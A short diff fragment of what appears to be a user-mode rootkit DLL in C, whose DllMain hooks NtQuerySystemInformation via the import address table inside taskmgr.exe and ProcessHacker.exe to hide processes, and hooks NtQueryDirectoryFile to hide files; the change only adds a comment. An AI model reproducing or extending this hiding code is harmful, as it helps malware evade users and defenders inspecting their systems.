@@ -190,7 +190,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 			installHook(querydirIAT, (LONG64)hookNtQueryDirectoryFile);
 			break;
 		}
-		else if ((lstrcmpiW(currentProcessName, L"taskmgr.exe") == 0) || (lstrcmpiW(currentProcessName,L"ProcessHacker.exe")==0)) {
+		else if ((lstrcmpiW(currentProcessName, L"taskmgr.exe") == 0) || (lstrcmpiW(currentProcessName,L"ProcessHacker.exe")==0)) {//add hide in processhacker
 			LONG64* querysysIAT = findIATaddr(NULL, "ntdll.dll", "NtQuerySystemInformation");//hideprocess
 			g_querysysteminformation_iat = querysysIAT;
 			g_querysysteminformation_addr = *querysysIAT;
